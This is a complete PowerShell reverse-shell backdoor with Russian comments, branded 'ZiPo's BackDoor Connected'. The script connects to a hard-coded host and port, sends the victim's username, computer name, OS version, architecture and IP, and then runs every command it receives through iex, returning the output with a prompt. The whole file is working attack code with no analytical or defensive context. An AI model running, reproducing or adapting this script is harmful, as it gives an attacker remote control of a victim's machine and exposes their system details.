$client = New-Object System.Net.Sockets.TCPClient("192.168.50.228",6666);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};

# ANSI escape code для очистки экрана и перемещения курсора влево вверх
$clearScreen = [System.Text.Encoding]::ASCII.GetBytes("`e[2J`e[H")
$stream.Write($clearScreen, 0, $clearScreen.Length)
$stream.Flush()

# ASCII-баннер
$banner = @"
 ________  .__              __________                .___           
 \______ \ |__| ____ ___.__. \______   \_______  ____ |__| ____  ____ 
  |    |  \|  |/    <   |  |  |     ___/\_  __ \/  _ \|  |/ ___\/ __ \\
  |    `   \  |   |  \___  |  |    |     |  | \(  <_> )  \  \__\  ___/
 /_______  /__|___|  / ____|  |____|     |__|   \____/|__|\___  >___  >
         \/        \/\/                                      \/    \/ 
             ZiPo's BackDoor Connected
"@

# Системная информация
$sysinfo = @"
Username: $env:USERNAME
Computer: $env:COMPUTERNAME
OS: $([System.Environment]::OSVersion.VersionString)
Architecture: $env:PROCESSOR_ARCHITECTURE
IP: $((Test-Connection -ComputerName (hostname) -Count 1).IPv4Address.IPAddressToString)

---------------------------------------------------
"@

# Объединение и отправка
$intro = "$banner`n$sysinfo"
$introBytes = [System.Text.Encoding]::ASCII.GetBytes($intro)
$stream.Write($introBytes, 0, $introBytes.Length)
$stream.Flush()
Start-Sleep -Milliseconds 300
$stream.Flush()

# Reverse shell loop
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};$client.Close()
